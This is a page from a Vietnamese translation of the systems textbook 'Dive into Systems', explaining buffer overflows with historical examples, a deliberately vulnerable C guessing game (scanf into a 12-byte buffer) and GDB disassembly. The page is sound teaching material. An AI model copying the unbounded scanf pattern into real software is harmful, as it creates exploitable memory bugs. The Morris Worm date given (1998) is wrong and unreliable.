<!DOCTYPE HTML>
<html lang="vi" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Buffer Overflows - Đắm mình vào hệ thống - Dive into Systems</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="../index.html"><strong aria-hidden="true">1.</strong> Home</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../copyright.html"><strong aria-hidden="true">1.1.</strong> Copyright</a></li><li class="chapter-item expanded "><a href="../acknowledgements.html"><strong aria-hidden="true">1.2.</strong> Acknowledgements</a></li><li class="chapter-item expanded "><a href="../preface.html"><strong aria-hidden="true">1.3.</strong> Preface</a></li></ol></li><li class="chapter-item expanded "><a href="../introduction.html"><strong aria-hidden="true">2.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="../C4-Binary/index.html"><strong aria-hidden="true">3.</strong> Binary and Data Representation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C4-Binary/bases.html"><strong aria-hidden="true">3.1.</strong> Number Bases and Unsigned Integers</a></li><li class="chapter-item expanded "><a href="../C4-Binary/conversion.html"><strong aria-hidden="true">3.2.</strong> Converting Between Bases</a></li><li class="chapter-item expanded "><a href="../C4-Binary/signed.html"><strong aria-hidden="true">3.3.</strong> Signed Binary Integers</a></li><li class="chapter-item expanded "><a href="../C4-Binary/arithmetic.html"><strong aria-hidden="true">3.4.</strong> Binary Integer Arithmetic</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C4-Binary/arithmetic_addition.html"><strong aria-hidden="true">3.4.1.</strong> Addition</a></li><li class="chapter-item expanded "><a href="../C4-Binary/arithmetic_subtraction.html"><strong aria-hidden="true">3.4.2.</strong> Subtraction</a></li><li class="chapter-item expanded "><a href="../C4-Binary/arithmetic_mult_div.html"><strong aria-hidden="true">3.4.3.</strong> Multiplication & Division</a></li></ol></li><li class="chapter-item expanded "><a href="../C4-Binary/overflow.html"><strong aria-hidden="true">3.5.</strong> Overflow</a></li><li class="chapter-item expanded "><a href="../C4-Binary/bitwise.html"><strong aria-hidden="true">3.6.</strong> Bitwise Operators</a></li><li class="chapter-item expanded "><a href="../C4-Binary/byte_order.html"><strong aria-hidden="true">3.7.</strong> Integer Byte Order</a></li><li class="chapter-item expanded "><a href="../C4-Binary/floating_point.html"><strong aria-hidden="true">3.8.</strong> Real Numbers in Binary</a></li><li class="chapter-item expanded "><a href="../C4-Binary/summary.html"><strong aria-hidden="true">3.9.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="../C5-Arch/index.html"><strong aria-hidden="true">4.</strong> What von Neumann Knew: Computer Architecture</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C5-Arch/hist.html"><strong aria-hidden="true">4.1.</strong> The Origins of Modern Computing</a></li><li class="chapter-item expanded "><a href="../C5-Arch/von.html"><strong aria-hidden="true">4.2.</strong> The von Neumann Architecture</a></li><li class="chapter-item expanded "><a href="../C5-Arch/gates.html"><strong aria-hidden="true">4.3.</strong> Logic Gates</a></li><li class="chapter-item expanded "><a href="../C5-Arch/circuits.html"><strong aria-hidden="true">4.4.</strong> Circuits</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C5-Arch/arithlogiccircs.html"><strong aria-hidden="true">4.4.1.</strong> Arithmetic and Logic Circuits</a></li><li class="chapter-item expanded "><a href="../C5-Arch/controlcircs.html"><strong aria-hidden="true">4.4.2.</strong> Control Circuits</a></li><li class="chapter-item expanded "><a href="../C5-Arch/storagecircs.html"><strong aria-hidden="true">4.4.3.</strong> Storage Circuits</a></li></ol></li><li class="chapter-item expanded "><a href="../C5-Arch/cpu.html"><strong aria-hidden="true">4.5.</strong> Building a Processor</a></li><li class="chapter-item expanded "><a href="../C5-Arch/instrexec.html"><strong aria-hidden="true">4.6.</strong> The Processor’s Execution of Program Instructions</a></li><li class="chapter-item expanded "><a href="../C5-Arch/pipelining.html"><strong aria-hidden="true">4.7.</strong> Pipelining Instruction Execution</a></li><li class="chapter-item expanded "><a href="../C5-Arch/pipelining_advanced.html"><strong aria-hidden="true">4.8.</strong> Advanced Pipelining Considerations</a></li><li class="chapter-item expanded "><a href="../C5-Arch/modern.html"><strong aria-hidden="true">4.9.</strong> Looking Ahead: CPUs Today</a></li><li class="chapter-item expanded "><a href="../C5-Arch/summary.html"><strong aria-hidden="true">4.10.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="../C6-asm_intro/index.html"><strong aria-hidden="true">5.</strong> Under the C: Dive into Assembly</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/index.html"><strong aria-hidden="true">6.</strong> -bit x86 Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C7-x86_64/basics.html"><strong aria-hidden="true">6.1.</strong> Assembly Basics</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/common.html"><strong aria-hidden="true">6.2.</strong> Common Instructions</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/arithmetic.html"><strong aria-hidden="true">6.3.</strong> Additional Arithmetic Instructions</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/conditional_control_loops.html"><strong aria-hidden="true">6.4.</strong> Conditional Control and Loops</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C7-x86_64/preliminaries.html"><strong aria-hidden="true">6.4.1.</strong> Preliminaries</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/if_statements.html"><strong aria-hidden="true">6.4.2.</strong> If Statements</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/loops.html"><strong aria-hidden="true">6.4.3.</strong> Loops</a></li></ol></li><li class="chapter-item expanded "><a href="../C7-x86_64/functions.html"><strong aria-hidden="true">6.5.</strong> Functions in Assembly</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/recursion.html"><strong aria-hidden="true">6.6.</strong> Recursion</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/arrays.html"><strong aria-hidden="true">6.7.</strong> Arrays in Assembly</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/matrices.html"><strong aria-hidden="true">6.8.</strong> Matrices in Assembly</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/structs.html"><strong aria-hidden="true">6.9.</strong> Structs in Assembly</a></li><li class="chapter-item expanded "><a href="../C7-x86_64/buffer_overflow.html"><strong aria-hidden="true">6.10.</strong> Buffer Overflows</a></li></ol></li><li class="chapter-item expanded "><a href="../C8-IA32/index.html"><strong aria-hidden="true">7.</strong> 64-bit x86 Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C8-IA32/basics.html"><strong aria-hidden="true">7.1.</strong> Assembly Basics</a></li><li class="chapter-item expanded "><a href="../C8-IA32/common.html"><strong aria-hidden="true">7.2.</strong> Common Instructions</a></li><li class="chapter-item expanded "><a href="../C8-IA32/arithmetic.html"><strong aria-hidden="true">7.3.</strong> Additional Arithmetic Instructions</a></li><li class="chapter-item expanded "><a href="../C8-IA32/conditional_control_loops.html"><strong aria-hidden="true">7.4.</strong> Conditional Control and Loops</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C8-IA32/preliminaries.html"><strong aria-hidden="true">7.4.1.</strong> Preliminaries</a></li><li class="chapter-item expanded "><a href="../C8-IA32/if_statements.html"><strong aria-hidden="true">7.4.2.</strong> If Statements</a></li><li class="chapter-item expanded "><a href="../C8-IA32/loops.html"><strong aria-hidden="true">7.4.3.</strong> Loops</a></li></ol></li><li class="chapter-item expanded "><a href="../C8-IA32/functions.html"><strong aria-hidden="true">7.5.</strong> Functions in Assembly</a></li><li class="chapter-item expanded "><a href="../C8-IA32/recursion.html"><strong aria-hidden="true">7.6.</strong> Recursion</a></li><li class="chapter-item expanded "><a href="../C8-IA32/arrays.html"><strong aria-hidden="true">7.7.</strong> Arrays in Assembly</a></li><li class="chapter-item expanded "><a href="../C8-IA32/matrices.html"><strong aria-hidden="true">7.8.</strong> Matrices in Assembly</a></li><li class="chapter-item expanded "><a href="../C8-IA32/structs.html"><strong aria-hidden="true">7.9.</strong> Structs in Assembly</a></li><li class="chapter-item expanded "><a href="../C8-IA32/buffer_overflow.html" class="active"><strong aria-hidden="true">7.10.</strong> Buffer Overflows</a></li></ol></li><li class="chapter-item expanded "><a href="../C9-ARM64/index.html"><strong aria-hidden="true">8.</strong> ARMv8 Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C9-ARM64/basics.html"><strong aria-hidden="true">8.1.</strong> Assembly Basics</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/common.html"><strong aria-hidden="true">8.2.</strong> Common Instructions</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/arithmetic.html"><strong aria-hidden="true">8.3.</strong> Arithmetic Instructions</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/conditional_control_loops.html"><strong aria-hidden="true">8.4.</strong> Conditional Control and Loops</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C9-ARM64/preliminaries.html"><strong aria-hidden="true">8.4.1.</strong> Preliminaries</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/if_statements.html"><strong aria-hidden="true">8.4.2.</strong> If Statements</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/loops.html"><strong aria-hidden="true">8.4.3.</strong> Loops</a></li></ol></li><li class="chapter-item expanded "><a href="../C9-ARM64/functions.html"><strong aria-hidden="true">8.5.</strong> Functions in Assembly</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/recursion.html"><strong aria-hidden="true">8.6.</strong> Recursion</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/arrays.html"><strong aria-hidden="true">8.7.</strong> Arrays in Assembly</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/matrices.html"><strong aria-hidden="true">8.8.</strong> Matrices in Assembly</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/structs.html"><strong aria-hidden="true">8.9.</strong> Structs in Assembly</a></li><li class="chapter-item expanded "><a href="../C9-ARM64/buffer_overflow.html"><strong aria-hidden="true">8.10.</strong> Buffer Overflows</a></li></ol></li><li class="chapter-item expanded "><a href="../C10-asm_takeaways/index.html"><strong aria-hidden="true">9.</strong> Key Assembly Takeaways</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/index.html"><strong aria-hidden="true">10.</strong> Storage and the Memory Hierarchy</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C11-MemHierarchy/mem_hierarchy.html"><strong aria-hidden="true">10.1.</strong> The Memory Hierarchy</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/devices.html"><strong aria-hidden="true">10.2.</strong> Storage Devices</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/locality.html"><strong aria-hidden="true">10.3.</strong> Locality</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/caching.html"><strong aria-hidden="true">10.4.</strong> Caching</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/cachegrind.html"><strong aria-hidden="true">10.5.</strong> Cache Analysis and Cachegrind</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/coherency.html"><strong aria-hidden="true">10.6.</strong> Looking Ahead: Caching on Multicore Processors</a></li><li class="chapter-item expanded "><a href="../C11-MemHierarchy/summary.html"><strong aria-hidden="true">10.7.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="../C12-CodeOpt/index.html"><strong aria-hidden="true">11.</strong> Code Optimization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C12-CodeOpt/basic.html"><strong aria-hidden="true">11.1.</strong> First Steps</a></li><li class="chapter-item expanded "><a href="../C12-CodeOpt/loops_functions.html"><strong aria-hidden="true">11.2.</strong> Other Compiler Optimizations</a></li><li class="chapter-item expanded "><a href="../C12-CodeOpt/memory_considerations.html"><strong aria-hidden="true">11.3.</strong> Memory Considerations</a></li><li class="chapter-item expanded "><a href="../C12-CodeOpt/summary.html"><strong aria-hidden="true">11.4.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="../C13-OS/index.html"><strong aria-hidden="true">12.</strong> The Operating System</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C13-OS/impl.html"><strong aria-hidden="true">12.1.</strong> Booting and Running</a></li><li class="chapter-item expanded "><a href="../C13-OS/processes.html"><strong aria-hidden="true">12.2.</strong> Processes</a></li><li class="chapter-item expanded "><a href="../C13-OS/vm.html"><strong aria-hidden="true">12.3.</strong> Virtual Memory</a></li><li class="chapter-item expanded "><a href="../C13-OS/ipc.html"><strong aria-hidden="true">12.4.</strong> Interprocess Communication</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C13-OS/ipc_signals.html"><strong aria-hidden="true">12.4.1.</strong> Signals</a></li><li class="chapter-item expanded "><a href="../C13-OS/ipc_msging.html"><strong aria-hidden="true">12.4.2.</strong> Message Passing</a></li><li class="chapter-item expanded "><a href="../C13-OS/ipc_shm.html"><strong aria-hidden="true">12.4.3.</strong> Shared Memory</a></li></ol></li><li class="chapter-item expanded "><a href="../C13-OS/advanced.html"><strong aria-hidden="true">12.5.</strong> Summary and Other OS Functionality</a></li></ol></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/index.html"><strong aria-hidden="true">13.</strong> Leveraging Shared Memory in the Multicore Era</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C14-SharedMemory/multicore.html"><strong aria-hidden="true">13.1.</strong> Programming Multicore Systems</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/posix.html"><strong aria-hidden="true">13.2.</strong> POSIX Threads</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/synchronization.html"><strong aria-hidden="true">13.3.</strong> Synchronizing Threads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C14-SharedMemory/mutex.html"><strong aria-hidden="true">13.3.1.</strong> Mutual Exclusion</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/semaphores.html"><strong aria-hidden="true">13.3.2.</strong> Semaphores</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/other_syncs.html"><strong aria-hidden="true">13.3.3.</strong> Other Synchronization Constructs</a></li></ol></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/performance.html"><strong aria-hidden="true">13.4.</strong> Measuring Parallel Performance</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C14-SharedMemory/performance_basics.html"><strong aria-hidden="true">13.4.1.</strong> Parallel Performance Basics</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/performance_advanced.html"><strong aria-hidden="true">13.4.2.</strong> Advanced Topics</a></li></ol></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/cache_coherence.html"><strong aria-hidden="true">13.5.</strong> Cache Coherence</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/thread_safety.html"><strong aria-hidden="true">13.6.</strong> Thread Safety</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/openmp.html"><strong aria-hidden="true">13.7.</strong> Implicit Threading with OpenMP</a></li><li class="chapter-item expanded "><a href="../C14-SharedMemory/summary.html"><strong aria-hidden="true">13.8.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="../C15-Parallel/index.html"><strong aria-hidden="true">14.</strong> Looking Ahead: Other Parallel Systems</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../C15-Parallel/gpu.html"><strong aria-hidden="true">14.1.</strong> Hardware Acceleration and CUDA</a></li><li class="chapter-item expanded "><a href="../C15-Parallel/distrmem.html"><strong aria-hidden="true">14.2.</strong> Distributed Memory Systems</a></li><li class="chapter-item expanded "><a href="../C15-Parallel/cloud.html"><strong aria-hidden="true">14.3.</strong> To Exascale and Beyond</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Đắm mình vào hệ thống - Dive into Systems</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h2 id="810-thực-tế-buffer-overflow"><a class="header" href="#810-thực-tế-buffer-overflow">8.10. Thực tế: Buffer Overflow</a></h2>
<p>Ngôn ngữ C không thực hiện việc kiểm tra giới hạn mảng (array bounds checking) một cách tự động.<br />
Việc truy cập bộ nhớ nằm ngoài phạm vi của một mảng là vấn đề nghiêm trọng và thường dẫn đến các lỗi như <strong>segmentation fault</strong>.<br />
Tuy nhiên, một kẻ tấn công tinh vi có thể chèn code độc để cố ý ghi đè ra ngoài biên của mảng (hay còn gọi là <strong>buffer</strong>) nhằm buộc chương trình thực thi theo cách không mong muốn.<br />
Trong trường hợp xấu nhất, kẻ tấn công có thể chạy code cho phép chúng giành được <strong>root privilege</strong> (quyền root) hoặc quyền truy cập cấp hệ điều hành vào hệ thống máy tính.<br />
Một phần mềm khai thác lỗ hổng tràn bộ đệm đã biết trong một chương trình được gọi là <strong>buffer overflow exploit</strong>.</p>
<p>Trong phần này, chúng ta sẽ sử dụng <strong>GDB</strong> và ngôn ngữ assembly để phân tích chi tiết cơ chế của một buffer overflow exploit.<br />
Trước khi đọc chương này, bạn nên tham khảo chương nói về <a href="../C3-C_debug/gdb_assembly.html#_debugging_assembly_code">GDB để kiểm tra code assembly</a>.</p>
<h3 id="8101-các-ví-dụ-nổi-tiếng-về-buffer-overflow"><a class="header" href="#8101-các-ví-dụ-nổi-tiếng-về-buffer-overflow">8.10.1. Các ví dụ nổi tiếng về Buffer Overflow</a></h3>
<p>Các buffer overflow exploit xuất hiện từ những năm 1980 và vẫn là mối đe dọa lớn của ngành công nghiệp máy tính cho đến đầu những năm 2000.<br />
Mặc dù nhiều hệ điều hành hiện đại đã có cơ chế bảo vệ chống lại các cuộc tấn công buffer overflow đơn giản nhất, nhưng các lỗi lập trình bất cẩn vẫn có thể khiến chương trình hiện đại dễ bị tấn công.<br />
Gần đây, các buffer overflow exploit đã được phát hiện trong <strong>Skype</strong>¹, <strong>Android</strong>², <strong>Google Chrome</strong>³ và nhiều phần mềm khác.</p>
<p>Dưới đây là một số ví dụ lịch sử đáng chú ý:</p>
<p><strong>The Morris Worm</strong><br />
Morris Worm⁴ được phát tán năm 1998 trên ARPANet từ MIT (nhằm che giấu việc nó được viết bởi một sinh viên Cornell) và khai thác lỗ hổng tràn bộ đệm trong <strong>Unix finger daemon</strong> (<code>fingerd</code>).<br />
Trong Linux và các hệ thống tương tự Unix, <strong>daemon</strong> là một loại tiến trình chạy nền liên tục, thường thực hiện các tác vụ dọn dẹp và giám sát.<br />
Daemon <code>fingerd</code> trả về báo cáo thân thiện về một máy tính hoặc người dùng.<br />
Điểm nguy hiểm nhất là con sâu này có cơ chế tự nhân bản, khiến nó được gửi nhiều lần tới cùng một máy tính, làm hệ thống chậm đến mức không thể sử dụng.<br />
Mặc dù tác giả tuyên bố đây chỉ là một thử nghiệm trí tuệ vô hại, nhưng cơ chế nhân bản đã giúp sâu lây lan dễ dàng và khó bị loại bỏ.<br />
Trong những năm sau đó, nhiều loại sâu khác cũng sử dụng buffer overflow exploit để truy cập trái phép vào hệ thống, ví dụ: <strong>Code Red</strong> (2001), <strong>MS-SQLSlammer</strong> (2003) và <strong>W32/Blaster</strong> (2003).</p>
<p><strong>AOL Chat Wars</strong><br />
David Auerbach⁵, cựu kỹ sư Microsoft, kể lại trải nghiệm của mình với một buffer overflow trong quá trình tích hợp <strong>Microsoft Messenger Service (MMS)</strong> với <strong>AOL Instant Messenger (AIM)</strong> vào cuối những năm 1990.<br />
Thời điểm đó, AIM là dịch vụ nhắn tin nhanh phổ biến nhất.<br />
Microsoft muốn chen chân vào thị trường này bằng cách thiết kế tính năng cho phép người dùng MMS trò chuyện với “buddies” trên AIM.<br />
Không hài lòng, AOL đã vá máy chủ để MMS không thể kết nối.<br />
Các kỹ sư Microsoft tìm ra cách để MMS giả lập thông điệp của AIM gửi tới máy chủ AOL, khiến AOL khó phân biệt tin nhắn từ MMS và AIM.<br />
AOL đáp trả bằng cách thay đổi định dạng tin nhắn của AIM, và MMS lại chỉnh sửa để bắt chước.<br />
Cuộc “chiến tranh chat” này tiếp diễn cho đến khi AOL sử dụng một lỗi buffer overflow <strong>ngay trong client của họ</strong> để xác minh tin nhắn đến từ AIM.<br />
Vì MMS không có lỗ hổng này, cuộc chiến kết thúc với phần thắng thuộc về AOL.</p>
<h3 id="8102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số"><a class="header" href="#8102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số">8.10.2. Cái nhìn đầu tiên: Trò chơi đoán số</a></h3>
<p>Để giúp bạn hiểu cơ chế của một cuộc tấn công buffer overflow, chúng tôi cung cấp một file thực thi 32-bit của một chương trình đơn giản cho phép người dùng chơi trò đoán số với máy.<br />
Tải file <code>secret</code> tại <a href="_attachments/secret.tar.gz">liên kết này</a> và giải nén bằng lệnh:</p>
<pre><code>$ tar -xzvf secret.tar.gz
</code></pre>
<p>Bên dưới là bản sao của <code>main.c</code> (<a href="_attachments/main.c">main.c</a>), file chính của chương trình:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot; //contains secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf(&quot;You win!\n&quot;);
    exit(0);
}

/*main function of the game*/
int main(void) {

    int guess, secret, len;
    char buf[12]; //buffer (12 bytes long)

    printf(&quot;Enter secret number:\n&quot;);
    scanf(&quot;%s&quot;, buf); //read guess from user input
    guess = atoi(buf); //convert to an integer

    secret = getSecretCode(); //call the getSecretCode() function

    //check to see if guess is correct
    if (guess == secret) {
        printf(&quot;You got it right!\n&quot;);
    }
    else {
        printf(&quot;You are so wrong!\n&quot;);
        return 1; //if incorrect, exit
    }

    printf(&quot;Enter the secret string to win:\n&quot;);
    scanf(&quot;%s&quot;, buf); //get secret string from user input

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret){
        printf(&quot;You lose!\n&quot;);
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
</code></pre>
<p>Chương trình này yêu cầu người dùng nhập một số bí mật và sau đó là một chuỗi bí mật để thắng trò chơi.<br />
File header <code>other.h</code> chứa định nghĩa của các hàm <code>getSecretCode</code> và <code>calculateValue</code>, nhưng chúng ta không có file này.<br />
Vậy làm sao để thắng trò chơi?<br />
Thử brute force sẽ mất quá nhiều thời gian.<br />
Một chiến lược là phân tích file thực thi <code>secret</code> trong GDB và bước qua code assembly để tìm ra số và chuỗi bí mật.<br />
Quá trình phân tích code assembly để hiểu cách nó hoạt động được gọi là <strong>reverse engineering</strong>.<br />
Những người thành thạo GDB và đọc assembly có thể dùng GDB để reverse engineer số và chuỗi bí mật.</p>
<p>Tuy nhiên, vẫn còn một cách khác tinh vi hơn để chiến thắng.</p>
<h3 id="8103-xem-xét-kỹ-hơn-under-the-c"><a class="header" href="#8103-xem-xét-kỹ-hơn-under-the-c">8.10.3. Xem xét kỹ hơn (Under the C)</a></h3>
<p>Chương trình có khả năng chứa lỗ hổng tràn bộ đệm tại lần gọi <code>scanf</code> đầu tiên.<br />
Để hiểu chuyện gì đang xảy ra, hãy kiểm tra code assembly của hàm <code>main</code> bằng GDB.<br />
Chúng ta sẽ đặt breakpoint tại địa chỉ <code>0x0804859f</code>, là lệnh ngay trước khi gọi <code>scanf</code> (nếu đặt breakpoint tại địa chỉ của <code>scanf</code>, chương trình sẽ dừng <strong>bên trong</strong> <code>scanf</code>, chứ không phải trong <code>main</code>).</p>
<pre><code>   0x08048582 &lt;+0&gt;:     push   %ebp
   0x08048583 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048588 &lt;+6&gt;:     sub    $0x38,%esp
   0x0804858b &lt;+9&gt;:     movl   $0x8048707,(%esp)
   0x08048592 &lt;+16&gt;:    call   0x8048390 &lt;printf@plt&gt;
   0x08048597 &lt;+21&gt;:    lea    0x1c(%esp),%eax
   0x0804859b &lt;+25&gt;:    mov    %eax,0x4(%esp)
=&gt; 0x0804859f &lt;+29&gt;:    movl   $0x804871c,(%esp)
   0x080485a6 &lt;+36&gt;:    call   0x80483e0 &lt;scanf@plt&gt;
</code></pre>
<p><strong>Hình 1</strong> mô tả stack ngay trước khi gọi <code>scanf</code>:</p>
<p><img src="_images/beforeScanf.png" alt="before" /><br />
<strong>Hình 1.</strong> Call stack ngay trước khi gọi <code>scanf</code></p>
<p>Trước khi gọi <code>scanf</code>, các tham số của nó được nạp sẵn vào stack, với tham số thứ nhất ở đỉnh stack và tham số thứ hai ở ngay dưới.<br />
Lệnh <code>lea</code> tại <code>&lt;main+21&gt;</code> tạo địa chỉ tham chiếu cho mảng <code>buf</code>.</p>
<p>Giả sử người dùng nhập <code>12345678</code> tại prompt.<br />
<strong>[afterScanf]</strong> minh họa stack ngay sau khi <code>scanf</code> hoàn tất:</p>
<p><img src="_images/afterScanf.png" alt="after" /><br />
<strong>Hình 2.</strong> Call stack ngay sau khi gọi <code>scanf</code> với input <code>12345678</code></p>
